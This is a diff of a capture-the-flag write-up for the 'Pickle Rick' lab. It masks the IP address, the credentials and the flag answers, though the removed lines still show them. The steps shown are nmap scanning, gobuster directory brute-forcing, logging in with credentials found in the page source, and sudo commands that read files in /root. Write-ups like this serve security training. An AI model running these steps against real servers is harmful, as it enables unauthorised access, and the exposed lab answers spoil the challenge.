@@ -16,52 +16,50 @@ This Rick and Morty themed challenge requires you to exploit a webserver to find
 
 | Title | IP Address |
 | :---- | :---- |
-| Pickle Rick | 10.10.136.127 |
+| Pickle Rick | `1*.**.***.***` |
 
 ## Discovery and Scanning
 
 ```bash
-sudo nmap -A -vv -T4 -oA initial 10.10.136.127
+sudo nmap -A -vv -T4 -oA initial 1*.**.***.***
 ```
 
-Result: [initial.nmap](initial.nmap)
+> `80/tcp open **** syn-ack ttl 61 A***** h**** 2.4.18 ((Ubuntu))`
 
-> `80/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))`
+View Page Source: `http://1*.**.***.***`
 
-View Page Source: `http://10.10.136.127`
-
-> `Username: R1ckRul3s`
+> `Username: R***R****`
 
 ```bash
-gobuster dir -u 10.10.136.127:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,cer,css,htm,html,js,jsp,php,py,xhtml -t 100
+gobuster dir -u 1*.**.***.***:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,cer,css,htm,html,js,jsp,php,py,xhtml -t 100
 ```
 
 > ```
 > /index.html           (Status: 200) [Size: 1062]
 > /login.php            (Status: 200) [Size: 882]
-> /robots.txt           (Status: 200) [Size: 17]
-> /assets               (Status: 301) [Size: 315] [--> http://10.10.136.127/assets/]
+> /r*****.***           (Status: 200) [Size: 17]
+> /assets               (Status: 301) [Size: 315] [--> http://1*.**.***.***/assets/]
 > /portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
 > /denied.php           (Status: 302) [Size: 0] [--> /login.php]
-> /clue.txt             (Status: 200) [Size: 54]                    
+> /c***.***             (Status: 200) [Size: 54]                    
 > /server-status        (Status: 403) [Size: 301]   
 > ```
 
-`http://10.10.136.127/robots.txt`
+Go to: `http://1*.**.***.***/r*****.***`
 
-> `Wubbalubbadubdub`
+> `W***************`
 
-`http://10.10.136.127/clue.txt`
+Go to: `http://1*.**.***.***/c***.***`
 
-> `Look around the file system for the other ingredient.`
+> `L*** a***** t** f*** s***** f** t** o**** i*********.`
 
 ## Exploitation
 
-Using `R1ckRul3s:Wubbalubbadubdub`
+Using `R***R****:W***************`
 
-`http://10.10.136.127/login.php`
+To: `http://1*.**.***.***/login.php`
 
-View Page Source: `http://10.10.136.127/portal.php#`
+View Page Source: `http://1*.**.***.***/portal.php#`
 
 > `<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->`
 
@@ -79,32 +77,32 @@ sudo -l
 ls -la
 ```
 
-> `-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt`
+> `-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 S****S*****P*****I*****.*** `
 
-`http://10.10.136.127/Sup3rS3cretPickl3Ingred.txt`
+Go to: `http://1*.**.***.***/S****S*****P*****I*****.*** `
 
-> `mr. meeseek hair`
+> `m*. m****** h***`
 
 ```bash
 ls -la /home/rick
 ```
 
-> `-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients`
+> `-rwxrwxrwx 1 root root   13 Feb 10  2019 s***** i**********`
 
 ```bash
-base64 "/home/rick/second ingredients" | base64 -d
+base64 "/home/rick/s***** i**********" | base64 -d
 ```
 
-> `1 jerry tear`
+> `1 j**** t***`
 
 ```bash
 sudo ls -la /root
 ```
 
-> `-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt`
+> `-rw-r--r--  1 root root   29 Feb 10  2019 3**.***`
 
 ```bash
-sudo base64 "/root/3rd.txt" | base64 -d
+sudo base64 "/root/3**.***" | base64 -d
 ```
 
-> `3rd ingredients: fleeb juice`
+> `3** i**********: f**** j****`
